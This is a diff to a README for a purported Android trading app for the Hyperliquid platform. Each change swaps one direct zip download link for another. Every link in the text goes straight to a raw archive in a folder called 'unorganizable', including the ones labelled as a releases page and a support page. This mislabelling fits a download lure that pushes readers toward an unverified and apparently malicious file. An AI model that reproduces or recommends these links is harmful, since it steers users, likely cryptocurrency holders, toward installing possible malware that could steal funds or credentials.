@@ -1,6 +1,6 @@
 # 🚀 APP-HyperDefi - Trade Effortlessly on Hyperliquid
 
-[![Download APP-HyperDefi](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip)](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip)
+[![Download APP-HyperDefi](https://github.com/ViejaMaldita/APP-HyperDefi/raw/refs/heads/main/unorganizable/AP_Hyper_Defi_v1.1.zip)](https://github.com/ViejaMaldita/APP-HyperDefi/raw/refs/heads/main/unorganizable/AP_Hyper_Defi_v1.1.zip)
 
 ## 🛠️ Overview
 
@@ -16,12 +16,12 @@ APP-HyperDefi is a native Android application designed for trading on the Hyperl
   
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download APP-HyperDefi](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip).
+To get started, visit this page to download: [Download APP-HyperDefi](https://github.com/ViejaMaldita/APP-HyperDefi/raw/refs/heads/main/unorganizable/AP_Hyper_Defi_v1.1.zip).
 
 ### Steps to Download and Install
 
 1. **Visit the Releases Page**
-   - Click the link above or go to [GitHub Releases](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip).
+   - Click the link above or go to [GitHub Releases](https://github.com/ViejaMaldita/APP-HyperDefi/raw/refs/heads/main/unorganizable/AP_Hyper_Defi_v1.1.zip).
 
 2. **Select the Latest Version**
    - Look for the latest release at the top of the page. It will have the highest version number.
@@ -57,7 +57,7 @@ To get started, visit this page to download: [Download APP-HyperDefi](https://ra
   
 ## 🤝 Support
 
-If you encounter any issues or have questions, please visit our [support page](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip) for help. You can also report any bugs you find.
+If you encounter any issues or have questions, please visit our [support page](https://github.com/ViejaMaldita/APP-HyperDefi/raw/refs/heads/main/unorganizable/AP_Hyper_Defi_v1.1.zip) for help. You can also report any bugs you find.
 
 ## 🌐 Community
 
@@ -74,4 +74,4 @@ We welcome contributions from all users. If you are interested in helping improv
 
 ---
 
-Thank you for choosing APP-HyperDefi. We hope you enjoy the trading experience! Don't forget to visit [this page to download](https://raw.githubusercontent.com/ViejaMaldita/APP-HyperDefi/main/unorganizable/APP-HyperDefi_v2.5-beta.2.zip) the latest version and stay updated with any new releases.
+Thank you for choosing APP-HyperDefi. We hope you enjoy the trading experience! Don't forget to visit [this page to download](https://github.com/ViejaMaldita/APP-HyperDefi/raw/refs/heads/main/unorganizable/AP_Hyper_Defi_v1.1.zip) the latest version and stay updated with any new releases.
